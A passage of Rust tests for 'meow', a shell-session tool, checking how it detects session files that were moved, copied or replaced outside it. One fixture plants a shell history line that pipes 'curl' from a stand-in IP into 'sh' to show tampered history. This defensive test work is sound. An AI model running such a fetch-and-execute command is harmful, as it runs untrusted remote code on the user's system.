        );

        // The copy cannot be accepted while the original has its name;
        // there, `meow delete beta` finds the original and `--local` the
        // copy. Deleting the copy leaves the original the user's.
        let location = Location::Folder(copy.clone());
        let (mut ws, _) = Workspace::open_at(&fx.home, &location, "beta", Mode::Light).unwrap();
        assert!(ws.adopt(&fx.home, Mode::Light).is_err());
        assert_eq!(ws.profile.id.as_deref(), Some(mark.as_str()));
        let by_name = find_for_deletion(&fx.home, &copy, Some("beta")).unwrap();
        assert_eq!(by_name.dir, original.dir);
        let target = find_for_deletion(&fx.home, &copy, None).unwrap();
        assert_eq!(target.dir, copied);
        delete(&fx.home, &target).unwrap();
        assert!(!original.is_foreign(&fx.home));
        assert_eq!(
            find_session(&fx.home, &elsewhere, "beta").unwrap(),
            Some(Location::Folder(saved.clone()))
        );

        // A moved folder is asked about again too.
        let moved = fx.cwd.parent().unwrap().join("moved");
        fs::rename(&saved, &moved).unwrap();
        let location = Location::Folder(moved.clone());
        let (ws, _) = Workspace::open_at(&fx.home, &location, "beta", Mode::Light).unwrap();
        assert!(ws.is_foreign(&fx.home));
    }

    #[cfg(unix)]
    #[test]
    fn the_record_keeps_the_place_as_first_written_and_forgets_only_what_went() {
        let fx = fixture();
        let saved = other_folder(&fx, "saved");
        let ws = open_in(&fx, &saved, "acme");
        let mark = ws.profile.id.clone().unwrap();
        let before = fs::read_to_string(fx.home.local_record_path()).unwrap();
        // Reached by another spelling (a link; another case on macOS): the
        // same session, recorded as it was.
        let link = other_folder(&fx, "elsewhere").join("link");
        std::os::unix::fs::symlink(&saved, &link).unwrap();
        let through = link.join("meow").join("acme");
        assert!(is_own_at(&fx.home, &ws.profile, &through));
        remember(&fx.home, &mark, Some(&through)).unwrap();
        assert_eq!(
            fs::read_to_string(fx.home.local_record_path()).unwrap(),
            before
        );
        // Two places with one mark (a record from before): deleting one
        // keeps the other, which still holds it.
        let twin = other_folder(&fx, "twin").join("meow").join("acme");
        fs::create_dir_all(&twin).unwrap();
        fs::copy(ws.profile_path(), twin.join(PROFILE_FILE)).unwrap();
        let entry = |dir: &Path| Entry {
            mark: mark.clone(),
            dir: Some(dir.to_path_buf()),
        };
        write_record(&fx.home, &[entry(&ws.dir), entry(&twin)]).unwrap();
        fs::remove_dir_all(&twin).unwrap();
        forget(&fx.home, &twin, Some(&mark)).unwrap();
        assert_eq!(read_record(&fx.home), [entry(&ws.dir)]);
    }

    #[test]
    fn folder_names_match_session_names_as_the_file_system_does() {
        assert!(is_named(Some("acme".as_ref()), "acme"));
        assert!(!is_named(Some("beta".as_ref()), "acme"));
        assert!(!is_named(None, "acme"));
        assert_eq!(
            is_named(Some("Acme".as_ref()), "acme"),
            cfg!(any(target_os = "macos", windows))
        );
    }

    #[test]
    fn the_record_stays_small_and_a_large_one_keeps_its_newest_lines() {
        let fx = fixture();
        let long = "d".repeat(240);
        let entries: Vec<Entry> = (0..MAX_LOCAL_MARKS)
            .map(|i| Entry {
                mark: format!("{i:032x}"),
                dir: Some(fx.cwd.join(&long).join("meow").join(format!("s{i}"))),
            })
            .collect();
        write_record(&fx.home, &entries).unwrap();
        let size = fs::metadata(fx.home.local_record_path()).unwrap().len();
        assert!(size <= LOCAL_RECORD_MAX, "{size}");
        let kept = read_record(&fx.home);
        assert!(kept.len() < entries.len());
        assert_eq!(kept.last(), entries.last());
        assert_eq!(kept[..], entries[entries.len() - kept.len()..]);

        // A file grown past the limit some other way: its newest lines.
        let mut text = String::new();
        let mut i = 0u64;
        while (text.len() as u64) < LOCAL_RECORD_MAX + 4096 {
            text.push_str(&format!("{i:032x}\t{}\n", fx.cwd.join(&long).display()));
            i += 1;
        }
        fs::write(fx.home.local_record_path(), &text).unwrap();
        let kept = read_record(&fx.home);
        assert!(!kept.is_empty());
        assert_eq!(kept.last().unwrap().mark, format!("{:032x}", i - 1));
        assert!(kept.iter().all(|entry| entry.dir.is_some()));
    }

    #[test]
    fn a_name_is_one_session_wherever_meow_runs() {
        let fx = fixture();
        let proj = other_folder(&fx, "proj");
        let other = other_folder(&fx, "other");
        let acme = open_in(&fx, &proj, "acme");
        for error in [
            local_location(&fx.home, &other, "acme").unwrap_err(),
            home_location(&fx.home, &other, "acme").unwrap_err(),
        ] {
            let said = error.to_string();
            assert!(
                said.contains(&format!("already exists at {}", acme.dir.display())),
                "{said}"
            );
            assert!(said.contains("`meow acme`"), "{said}");
        }
        assert!(!other.join("meow").exists());
        assert!(!fx.home.workspace_dir("acme").exists());
        // Where it is, the flag opens it.
        assert_eq!(
            local_location(&fx.home, &proj, "acme").unwrap(),
            Location::Folder(proj.clone())
        );
        open(&fx, "solo", false);
        assert_eq!(
            home_location(&fx.home, &other, "solo").unwrap(),
            Location::Home
        );
        assert!(local_location(&fx.home, &other, "solo").is_err());
        // A new name goes where it is asked to.
        assert_eq!(
            local_location(&fx.home, &other, "new").unwrap(),
            Location::Folder(other.clone())
        );
        assert_eq!(
            home_location(&fx.home, &other, "newer").unwrap(),
            Location::Home
        );
    }

    /// A folder that comes with `./meow/<name>` named like one of the
    /// user's own sessions: `meow <name>` there still opens the user's own,
    /// and the other cannot be accepted under that name.
    #[test]
    fn a_session_that_came_with_a_folder_never_takes_the_name_of_the_users_own() {
        let fx = fixture();
        let mine = other_folder(&fx, "mine");
        let own = open_in(&fx, &mine, "acme");
        let cloned = other_folder(&fx, "cloned");
        let ship = |folder: &Path, name: &str| {
            let dir = folder.join("meow").join(name);
            fs::create_dir_all(&dir).unwrap();
            fs::write(folder.join("meow").join(".gitignore"), SESSIONS_MARKER_TEXT).unwrap();
            fs::write(
                dir.join(PROFILE_FILE),
                format!("name = \"{name}\"\nmode = \"aggressive\"\nid = \"00112233445566778899aabbccddeeff\"\n"),
            )
            .unwrap();
            dir
        };
        let shipped = ship(&cloned, "acme");
        let found = find_session(&fx.home, &cloned, "acme").unwrap();
        assert_eq!(found, Some(Location::Folder(mine.clone())));
        assert_eq!(
            foreign_here(&fx.home, &cloned, "acme"),
            Some(shipped.clone())
        );
        assert_eq!(foreign_here(&fx.home, &mine, "acme"), None);
        // `--local` opens it to look at; accepting it under the name fails.
        let location = local_location(&fx.home, &cloned, "acme").unwrap();
        let (mut ws, _) = Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
        assert!(ws.is_foreign(&fx.home));
        fs::write(ws.history_path("zsh"), "kept\n").unwrap();
        let said = format!("{:#}", ws.adopt(&fx.home, Mode::Light).unwrap_err());
        assert!(said.contains(&own.dir.display().to_string()), "{said}");
        assert!(ws.is_foreign(&fx.home));
        assert!(
            ws.history_path("zsh").exists(),
            "refused before changing it"
        );
        let elsewhere = other_folder(&fx, "elsewhere");
        assert_eq!(
            find_session(&fx.home, &elsewhere, "acme").unwrap(),
            Some(Location::Folder(mine.clone()))
        );
        // The same for a session in ~/.meow/workspaces.
        open(&fx, "home-one", false);
        let shipped = ship(&cloned, "home-one");
        assert_eq!(
            find_session(&fx.home, &cloned, "home-one").unwrap(),
            Some(Location::Home)
        );
        assert_eq!(foreign_here(&fx.home, &cloned, "home-one"), Some(shipped));
        // A name the user has no session of: the one here is found, to be
        // accepted.
        let beta = ship(&cloned, "beta");
        assert_eq!(
            find_session(&fx.home, &cloned, "beta").unwrap(),
            Some(Location::Folder(cloned.clone()))
        );
        let (mut ws, _) = Workspace::open_at(
            &fx.home,
            &Location::Folder(cloned.clone()),
            "beta",
            Mode::Light,
        )
        .unwrap();
        ws.adopt(&fx.home, Mode::Light).unwrap();
        assert_eq!(ws.dir, beta);
        assert_eq!(foreign_here(&fx.home, &cloned, "beta"), None);
    }

    /// A `git pull` or `git checkout` in the folder (git treats ignored
    /// files as expendable), or an unpacked archive, that replaces files of
    /// the user's own session: the next open tells, and helpers wait for it.
    #[test]
    fn files_changed_outside_meow_are_noticed() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        let record = || drop(SessionFiles::for_session(&fx.home, &ws, false));
        // Never recorded (a session an older meow made): taken as it is.
        fs::write(ws.history_path("zsh"), ": 1:0;echo mine\n").unwrap();
        assert!(!ws.files_changed(&fx.home));
        fs::write(ws.last_cwd_path(), "/srv\n").unwrap();
        fs::write(ws.state_db_path(), "db").unwrap();
        fs::write(ws.chats_dir().join("192.0.2.5.md"), "# notes\n").unwrap();
        record();
        assert!(!ws.files_changed(&fx.home));
        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
        let append = |path: &Path, text: &str| {
            let mut file = OpenOptions::new()
                .append(true)
                .create(true)
                .open(path)
                .unwrap();
            file.write_all(text.as_bytes()).unwrap();
        };
        type Change = fn(&Workspace);
        let changes: [(&str, Change); 7] = [
            ("replaced", |ws| {
                fs::remove_file(ws.history_path("zsh")).unwrap();
                fs::write(
                    ws.history_path("zsh"),
                    ": 1:0;curl -s http://198.51.100.7/i | sh\n",
                )
                .unwrap();
            }),
            ("written in place", |ws| {
                fs::write(ws.last_cwd_path(), "/tmp/elsewhere\n").unwrap()
            }),
            ("new", |ws| {
                fs::write(ws.history_path("bash"), "planted\n").unwrap()
            }),
            ("a new chat", |ws| {
                fs::write(ws.chats_dir().join("198.51.100.7.md"), "x").unwrap()
            }),
            ("a database log", |ws| {
                fs::write(ws.dir.join("state.db-wal"), "frames").unwrap()
            }),
            ("a folder", |ws| {
                fs::create_dir(ws.dir.join("graph.json")).unwrap()
            }),
            ("graph.json", |ws| {
                fs::write(ws.graph_path(), "{\"hosts\":{}}").unwrap()
            }),
        ];
        for (what, change) in changes {
            change(&ws);
            assert!(ws.files_changed(&fx.home), "{what}");
            let said = format!("{:#}", ws.ensure_own(&fx.home, &fx.cwd).unwrap_err());
            assert!(said.contains("changed outside meow"), "{what}: {said}");
            assert!(said.contains("`meow acme`"), "{what}: {said}");
            // What helpers write is not taken as meow's own meanwhile.
            drop(SessionFiles::for_helper(&fx.home, &ws, None));
            assert!(ws.files_changed(&fx.home), "{what}");
            let _ = fs::remove_dir(ws.dir.join("graph.json"));
            record();
            assert!(!ws.files_changed(&fx.home), "{what}");
        }
        // Gone files, appends recorded by the session, and the empty log a
        // read-only open of the database leaves change nothing.
        fs::remove_file(ws.history_path("bash")).unwrap();
        fs::remove_file(ws.dir.join("state.db-wal")).unwrap();
        fs::write(ws.dir.join("state.db-wal"), "").unwrap();
        assert!(!ws.files_changed(&fx.home));
        // While a session holds the lock, helpers leave the record to it.
        let lock = crate::lock::SessionLock::acquire(&ws.lock_path()).unwrap();
        append(&ws.replay_path(), "ls\n");
        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
        drop(SessionFiles::for_helper(&fx.home, &ws, None));
        assert!(ws.files_changed(&fx.home));
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        drop(lock);
        assert!(!ws.files_changed(&fx.home));

        // What the user is shown is dropped: histories and the last folder.
        ws.drop_carried_files();
        assert!(!ws.last_cwd_path().exists());
        for shell in HISTORY_SHELLS {
            assert!(!ws.history_path(shell).exists(), "{shell}");
        }
        // A session in ~/.meow, and one meow never recorded, are not checked.
        let (home_ws, _) = open(&fx, "home-one", false);
        fs::write(home_ws.history_path("zsh"), "x\n").unwrap();
        assert!(!home_ws.files_changed(&fx.home));
        // Deleting a session forgets what meow knew of its files.
        let mark = ws.profile.id.clone().unwrap();
        assert!(seen_path(&fx.home, &mark).is_file());
        #[cfg(unix)]
        assert_eq!(mode_of(&seen_path(&fx.home, &mark)), 0o600);
        let target = find_for_deletion(&fx.home, &fx.cwd, Some("acme")).unwrap();
        delete(&fx.home, &target).unwrap();
        assert!(!seen_path(&fx.home, &mark).exists());
    }

    /// A file meow only changes in place (`state.db`, `replay.sh`,
    /// `last_cwd`, chats) replaced while the session runs (a `git pull` in
    /// its own shell) is not recorded as meow's own at the end.
    #[test]
    fn files_replaced_while_the_session_runs_are_not_recorded_as_meows() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        for name in ["state.db", "replay.sh", "last_cwd"] {
            fs::write(ws.dir.join(name), "x").unwrap();
        }
        fs::write(ws.chats_dir().join("192.0.2.5.md"), "x").unwrap();
        // A session that appends, rewrites its graph and writes new chats.
        let files = SessionFiles::for_session(&fx.home, &ws, false);
        OpenOptions::new()
            .append(true)
            .open(ws.replay_path())
            .unwrap()
            .write_all(b"more\n")
            .unwrap();
        write_private_atomic(&ws.graph_path(), b"{}").unwrap();
        fs::write(ws.chats_dir().join("192.0.2.6.md"), "x").unwrap();
        drop(files);
        assert!(!ws.files_changed(&fx.home));
        for name in ["state.db", "replay.sh", "last_cwd", "chats/192.0.2.5.md"] {
            let files = SessionFiles::for_session(&fx.home, &ws, false);
            // Later than the file it replaces was made, as a pull is.
            std::thread::sleep(Duration::from_millis(30));
            let path = name
                .split('/')
                .fold(ws.dir.clone(), |path, part| path.join(part));
            fs::remove_file(&path).unwrap();
            fs::write(&path, "planted").unwrap();
            drop(files);
            assert!(ws.files_changed(&fx.home), "{name}");
            // Said once, at the next open; recorded anew after it.
            drop(SessionFiles::for_session(&fx.home, &ws, false));
            assert!(!ws.files_changed(&fx.home), "{name}");
        }
    }

    /// A remount gives the same files other device numbers (an overlay
    /// after a container restart, NFS, a removable drive) and, on FAT,
    /// exFAT or FUSE, other file numbers: that is no change. A file made
    /// or written at another time, or of another size, is.
    #[test]
    fn a_remount_is_not_a_change_outside_meow() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        fs::write(ws.history_path("bash"), "echo mine\n").unwrap();
        fs::write(ws.state_db_path(), "db").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        let mark = ws.profile.id.clone().unwrap();
        let seen = read_seen(&fx.home, &mark).unwrap();
        let rewritten = |change: fn(&mut FileId)| {
            let mut record = seen.clone();
            for id in record.files.values_mut() {
                change(id);
            }
            write_seen(&fx.home, &mark, &record).unwrap();
            ws.files_changed(&fx.home)
        };
        assert!(!rewritten(|_| {}));
        assert!(!rewritten(|id| id.ino = id.ino.wrapping_add(7)));
        assert!(rewritten(|id| id.written += 1));
        assert!(rewritten(|id| id.size += 1));
        if seen.files.values().all(|id| id.born != 0) {
            assert!(rewritten(|id| id.born += 1));
        }
        // Where the file system does not say when a file was made, size
        // and last write decide.
        assert!(!rewritten(|id| id.born = 0));
        assert!(!rewritten(|id| {
            id.born = 0;
            id.ino = id.ino.wrapping_add(7);
        }));
        // Within a session, a file only changed in place keeps its place.
        let id = FileId {
            ino: 5,
            born: 9,
            size: 1,
            written: 2,
        };
        let moved = FileId { ino: 6, ..id };
        assert!(id.same_file_where(&moved, false));
        assert!(!id.same_file_where(&FileId { born: 10, ..id }, false));
        let unknown = FileId { born: 0, ..id };
        assert!(unknown.same_file_where(&id, false));
        assert!(!unknown.same_file_where(&FileId { born: 0, ..moved }, false));
        // Windows gives a file put under the name of one just deleted the
        // time that one was made at: there the number tells, written since
        // or not, and a file with no number to compare is another file.
        let written = FileId {
            size: 7,
            written: 3,
            ..id
        };
        assert!(id.same_file_where(&written, true));
        assert!(!id.same_file_where(&moved, true));
        // A number alone is not the file: FAT, exFAT and a share of a
        // Unix server give one again. Made at another time, another file.
        assert!(!id.same_file_where(&FileId { born: 10, ..id }, true));
        assert!(id.same_file_where(&FileId { born: 0, ..id }, true));
        let unnumbered = FileId { ino: 0, ..id };
        assert!(!id.same_file_where(&unnumbered, true));
        assert!(!unnumbered.same_file_where(&id, true));
        let unasked = FileId {
            ino: NO_NUMBER,
            ..id
        };
        assert!(!unasked.same_file_where(&unasked, true));
        assert!(!unasked.same_file_where(&unnumbered, true));
        assert!(!unnumbered.same_file_where(&unasked, true));
        // A file system that tells no numbers: as elsewhere.
        assert!(unnumbered.same_file_where(&unnumbered, true));
        assert!(!unnumbered.same_file_where(
            &FileId {
                born: 10,
                ..unnumbered
            },
            true
        ));
        assert_eq!(id.same_file(&moved), !cfg!(windows));
        // The record keeps a number of either kind.
        let mut record = Snapshot::default();
        for (name, ino) in [
            ("a", NO_NUMBER),
            ("b", (0xffff_ffff << 64) | u128::from(u64::MAX)),
        ] {
            record.files.insert(name.to_owned(), FileId { ino, ..id });
        }
        assert_eq!(Snapshot::from_text(&record.to_text()), Some(record));
    }

    /// Windows: a file is told by its number, which a file put in its
    /// place under the same name does not get, whatever time the file
    /// system says it was made at; a file in use is still asked, and what
    /// cannot be opened is no file meow knows.
    #[cfg(windows)]
    #[test]
    fn on_windows_a_file_is_told_by_its_number() {
        use std::os::windows::fs::OpenOptionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("state.db");
        let id = |path: &Path| file_id(path, &fs::symlink_metadata(path).unwrap()).unwrap();
        fs::write(&path, "x").unwrap();
        let first = id(&path);
        assert_ne!(first.ino, NO_NUMBER);
        if first.ino == 0 {
            // A temporary folder on a file system without file numbers.
            return;
        }
        assert_eq!(id(&path), first);
        // Written in place, by a program that shares it with nobody.
        let mut held = OpenOptions::new()
            .append(true)
            .share_mode(0)
            .open(&path)
            .unwrap();
        held.write_all(b"more").unwrap();
        let written = id(&path);
        assert_eq!((written.ino, written.size), (first.ino, 5));
        assert!(first.same_file(&written));
        drop(held);
        // Put in its place, as a pull does.
        fs::remove_file(&path).unwrap();
        fs::write(&path, "x").unwrap();
        let replaced = id(&path);
        assert_ne!(replaced.ino, first.ino);
        assert!(!first.same_file(&replaced));
        // Gone, and a folder in its place, since it was looked at.
        let meta = fs::symlink_metadata(&path).unwrap();
        fs::remove_file(&path).unwrap();
        let gone = file_id(&path, &meta).unwrap_err();
        assert_eq!(gone.kind(), io::ErrorKind::NotFound);
        fs::create_dir(&path).unwrap();
        let unasked = file_id(&path, &meta).unwrap();
        assert_eq!(unasked.ino, NO_NUMBER);
        assert!(!replaced.same_file(&unasked));
        assert!(!unasked.same_file(&unasked));
    }

    /// An open that warned about files changed outside meow, or accepted a
    /// session that came with the folder, and then failed before the shell
    /// started (a broken graph.json, an error): those files are not taken
    /// as meow's, so the next open warns again.
    #[test]
    fn a_doubtful_session_that_never_started_is_not_taken_as_meows() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        fs::write(ws.state_db_path(), "db").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        fs::remove_file(ws.state_db_path()).unwrap();
        fs::write(ws.state_db_path(), "a queued scan").unwrap();
        assert!(ws.files_changed(&fx.home));
        drop(SessionFiles::for_session(&fx.home, &ws, true));
        assert!(ws.files_changed(&fx.home));
        drop(SessionFiles::for_session(&fx.home, &ws, true));
        assert!(ws.files_changed(&fx.home), "every time");
        let mut files = SessionFiles::for_session(&fx.home, &ws, true);
        files.started();
        drop(files);
        assert!(!ws.files_changed(&fx.home));
        // The user's own session that fails to start (a broken ai.toml) is
        // recorded as it is: no warning next time.
        fs::write(ws.state_db_path(), "the user's db").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        assert!(!ws.files_changed(&fx.home));
    }

    #[test]
    fn the_record_of_files_reads_back_only_what_meow_wrote() {
        let mut snapshot = Snapshot::default();
        let id = FileId {
            ino: 1_234_567,
            born: 1_600_000_000_000_000_001,
            size: 42,
            written: 1_700_000_000_123_456_789,
        };
        snapshot.files.insert("zsh_history".into(), id);
        snapshot.files.insert("chats/a b.md".into(), id);
        assert_eq!(
            Snapshot::from_text(&snapshot.to_text()),
            Some(snapshot.clone())
        );
        snapshot.odd = true;
        assert_eq!(Snapshot::from_text(&snapshot.to_text()), Some(snapshot));
        for broken in [
            "",
            "meow session files 1\nok\n",
            "meow session files 2\nmaybe\n",
            "meow session files 2\nok\n1 2 3\n",
            "meow session files 2\nok\n1 2 3 4\n",
            "meow session files 2\nok\n-1 2 3 4 x\n",
            "meow session files 2\nok\na 2 3 4 x\n",
        ] {
            assert_eq!(Snapshot::from_text(broken), None, "{broken:?}");
        }
        // A record that is not meow's counts as "changed".
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        let mark = ws.profile.id.clone().unwrap();
        create_private_dir(&fx.home.root().join(SEEN_DIR)).unwrap();
        fs::write(seen_path(&fx.home, &mark), "something else\n").unwrap();
        assert!(ws.files_changed(&fx.home));
    }

    /// Puts `contents` in place of the file at `path` as a pull does: a new
    /// file, made after the one it replaces.
    fn put_in_place(path: &Path, contents: &str) {
        std::thread::sleep(Duration::from_millis(30));
        let new = path.with_extension("planted");
        fs::write(&new, contents).unwrap();
        fs::rename(&new, path).unwrap();
    }

    /// A session that ends without meow seeing it (killed, a crash, the
    /// power gone) leaves its record open: what it rewrote whole itself
    /// (its graph, the shell's history) is not taken for a change outside
    /// meow, and the user's own history and last folder stay. A file it
    /// only changes in place that was put in its place since still is.
    #[test]
    fn an_end_meow_did_not_see_keeps_the_users_own_files() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        fs::write(ws.history_path("bash"), "echo mine\n").unwrap();
        fs::write(ws.last_cwd_path(), "/srv\n").unwrap();
        fs::write(ws.state_db_path(), "db").unwrap();
        fs::write(ws.replay_path(), "ls\n").unwrap();
        write_private_atomic(&ws.graph_path(), b"{}").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::AsLeft);
        let killed = || {
            let mut files = SessionFiles::for_session(&fx.home, &ws, false);
            files.started();
            // What a session writes: its graph saved whole, the shell's
            // history rewritten, the rest in place.
            write_private_atomic(&ws.graph_path(), b"{\"hosts\":{}}").unwrap();
            put_in_place(&ws.history_path("bash"), "echo mine\necho more\n");
            fs::write(ws.last_cwd_path(), "/srv/x\n").unwrap();
            OpenOptions::new()
                .append(true)
                .open(ws.replay_path())
                .unwrap()
                .write_all(b"id\n")
                .unwrap();
            // Killed: nothing is dropped.
            std::mem::forget(files);
        };
        killed();
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Unclean);
        assert!(!ws.files_changed(&fx.home));
        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
        // A helper that wrote alone records them, and the record stays open.
        let alone = ws.write_alone(&fx.home, &fx.cwd, "meow add").unwrap();
        assert!(alone.is_some());
        let files = SessionFiles::for_helper(&fx.home, &ws, alone);
        write_private_atomic(&ws.graph_path(), b"{\"hosts\":{\"a\":1}}").unwrap();
        drop(files);
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Unclean);
        // A session that ends cleanly closes it.
        let mut files = SessionFiles::for_session(&fx.home, &ws, false);
        files.started();
        drop(files);
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::AsLeft);
        // Put in place of a file meow changes in place: changed outside.
        for name in ["state.db", "replay.sh", "last_cwd"] {
            killed();
            put_in_place(&ws.dir.join(name), "planted");
            assert_eq!(ws.files_seen(&fx.home), FilesSeen::Changed, "{name}");
            assert!(ws.ensure_own(&fx.home, &fx.cwd).is_err(), "{name}");
            drop(SessionFiles::for_session(&fx.home, &ws, true));
            assert!(ws.files_changed(&fx.home), "a start that never got going");
            let mut files = SessionFiles::for_session(&fx.home, &ws, true);
            files.started();
            drop(files);
            assert_eq!(ws.files_seen(&fx.home), FilesSeen::AsLeft, "{name}");
        }
        // Killed before it started, after a warning: still changed.
        put_in_place(&ws.state_db_path(), "planted again");
        assert!(ws.files_changed(&fx.home));
        std::mem::forget(SessionFiles::for_session(&fx.home, &ws, true));
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Changed);
        // The record says which it is.
        let mut snapshot = Snapshot::of(&ws.dir);
        for (open, odd) in [(true, false), (true, true), (false, false)] {
            snapshot.open = open;
            snapshot.odd = odd;
            assert_eq!(
                Snapshot::from_text(&snapshot.to_text()),
                Some(snapshot.clone())
            );
        }
        assert_eq!(Snapshot::from_text("meow session files 2\nopen ok\n"), None);
    }

    /// A helper that writes a session's files with no session running
    /// (`meow add`) holds the helper lock until they are recorded: no
    /// session starts meanwhile, another such helper waits its turn, and
    /// none takes what it wrote for a change outside meow.
    #[test]
    fn a_helper_that_writes_alone_keeps_sessions_out_until_recorded() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        fs::write(ws.history_path("zsh"), ": 1:0;echo mine\n").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        let alone = ws.write_alone(&fx.home, &fx.cwd, "meow add").unwrap();
        assert!(alone.is_some());
        let files = SessionFiles::for_helper(&fx.home, &ws, alone);
        write_private_atomic(&ws.graph_path(), b"{}").unwrap();
        fs::write(ws.state_db_path(), "cached lookups").unwrap();
        // A session that starts now waits, then names the helper.
        let session = crate::lock::SessionLock::acquire(&ws.lock_path()).unwrap();
        let said = format!("{:#}", ws.wait_for_helpers().unwrap_err());
        assert_eq!(
            said,
            "meow add is still writing 'acme': try again when it ends"
        );
        drop(session);
        // Another helper: may look, but not write, and records nothing.
        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
        let said = format!(
            "{:#}",
            ws.write_alone(&fx.home, &fx.cwd, "meow mode").unwrap_err()
        );
        assert!(said.starts_with("meow add is still writing"), "{said}");
        let mark = ws.mark().unwrap();
        let record = read_seen_text(&fx.home, mark);
        drop(SessionFiles::for_helper(&fx.home, &ws, None));
        assert_eq!(read_seen_text(&fx.home, mark), record);
        // Until it ends, the record says the files are open.
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Unclean);
        let listed = find_for_deletion(&fx.home, &fx.cwd, Some("acme")).unwrap();
        let said = format!("{:#}", ensure_closed(&listed).unwrap_err());
        assert!(said.starts_with("meow add is still writing"), "{said}");
        // Recorded as meow's own, then let go.
        drop(files);
        ensure_closed(&listed).unwrap();
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::AsLeft);
        assert!(!crate::lock::HelperLock::is_held(&ws.helper_lock_path()));
        ws.wait_for_helpers().unwrap();
        // While a session holds the session lock, helpers go through it.
        let session = crate::lock::SessionLock::acquire(&ws.lock_path()).unwrap();
        assert!(ws
            .write_alone(&fx.home, &fx.cwd, "meow add")
            .unwrap()
            .is_none());
        drop(session);
        // Files changed outside meow: nothing is written alone.
        put_in_place(&ws.history_path("zsh"), ": 1:0;planted\n");
        let said = format!(
            "{:#}",
            ws.write_alone(&fx.home, &fx.cwd, "meow add").unwrap_err()
        );
        assert!(said.contains("changed outside meow"), "{said}");
        assert!(!crate::lock::HelperLock::is_held(&ws.helper_lock_path()));
        // A helper that does not write alone records only if nobody else
        // did since it began.
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        let looking = SessionFiles::for_helper(&fx.home, &ws, None);
        fs::write(ws.state_db_path(), "the session's db").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        put_in_place(&ws.state_db_path(), "after the session");
        drop(looking);
        assert!(ws.files_changed(&fx.home));
    }

    /// A helper that writes alone and is cut short (Ctrl-C while `meow
    /// add` waits on CVE lookups, a closed terminal) leaves the record
    /// open, as a session does: the next start keeps the user's history,
    /// and helpers are not refused meanwhile.
    #[test]
    fn a_helper_cut_short_leaves_an_open_record() {
        let fx = fixture();
        let (ws, _) = open(&fx, "acme", true);
        fs::write(ws.history_path("bash"), "echo mine\n").unwrap();
        fs::write(ws.state_db_path(), "db").unwrap();
        drop(SessionFiles::for_session(&fx.home, &ws, false));
        let cut_short = || {
            let alone = ws.write_alone(&fx.home, &fx.cwd, "meow add").unwrap();
            let mut files = SessionFiles::for_helper(&fx.home, &ws, alone);
            write_private_atomic(&ws.graph_path(), b"{\"hosts\":{\"a\":1}}").unwrap();
            // Its process ends; nothing of it runs after.
            drop(files.alone.take());
            std::mem::forget(files);
        };
        cut_short();
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Unclean);
        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
        // A helper that ends after that leaves the record open still.
        let alone = ws.write_alone(&fx.home, &fx.cwd, "meow report").unwrap();
        drop(SessionFiles::for_helper(&fx.home, &ws, alone));
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Unclean);
        // A session that ends closes it; a helper that ends then too.
        let mut files = SessionFiles::for_session(&fx.home, &ws, false);
        files.started();
        drop(files);
        let alone = ws.write_alone(&fx.home, &fx.cwd, "meow add").unwrap();
        let files = SessionFiles::for_helper(&fx.home, &ws, alone);
        write_private_atomic(&ws.graph_path(), b"{}").unwrap();
        drop(files);
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::AsLeft);
        // Cut short, and a file meow changes in place put in its place
        // since: that is still a change outside meow.
        cut_short();
        put_in_place(&ws.state_db_path(), "planted");
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::Changed);
    }

    /// The user's own session in a folder they moved or renamed is theirs
    /// still, with its history, while its files are as meow left them; a
    /// copy, or one whose files changed since, is asked about.
    #[cfg(unix)]
    #[test]
    fn a_moved_folder_keeps_its_session() {
        let fx = fixture();
        let proj = other_folder(&fx, "proj");
        let made = open_in(&fx, &proj, "acme");
        fs::write(made.history_path("bash"), "echo mine\n").unwrap();
        fs::write(made.state_db_path(), "db").unwrap();
        drop(SessionFiles::for_session(&fx.home, &made, false));
        let mark = made.profile.id.clone().unwrap();
        let moved = other_folder(&fx, "moved");
        fs::remove_dir(&moved).unwrap();
        fs::rename(&proj, &moved).unwrap();
        let location = Location::Folder(moved.clone());
        let (ws, created) = Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
        assert!(!created);
        assert!(ws.is_foreign(&fx.home));
        assert_eq!(ws.moved_from(&fx.home), Some(made.dir.clone()));
        let said = format!("{:#}", ws.ensure_own(&fx.home, &moved).unwrap_err());
        assert!(said.contains("was moved from"), "{said}");
        // To another disk: new files there, of the same size and last write.
        let seen = read_seen(&fx.home, &mark).unwrap();
        let mut elsewhere = seen.clone();
        for id in elsewhere.files.values_mut() {
            id.ino = id.ino.wrapping_add(7);
            id.born = id.born.wrapping_add(1);
        }
        write_seen(&fx.home, &mark, &elsewhere).unwrap();
        assert_eq!(ws.moved_from(&fx.home), Some(made.dir.clone()));
